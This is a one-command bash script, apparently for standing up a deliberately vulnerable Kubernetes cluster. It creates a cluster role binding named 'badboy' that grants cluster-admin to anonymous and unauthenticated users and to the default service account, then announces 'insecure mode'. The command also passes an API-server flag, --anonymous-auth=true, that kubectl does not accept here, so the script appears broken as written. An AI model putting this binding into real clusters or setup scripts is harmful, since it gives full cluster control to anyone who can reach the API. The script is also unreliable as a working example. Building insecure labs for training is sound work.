#!/usr/bin/env bash

kubectl create clusterrolebinding badboy  --user system:anonymous --group system:unauthenticated --anonymous-auth=true --clusterrole cluster-admin --serviceaccount=default:default
echo "kubernetes initialized in insecure mode..."
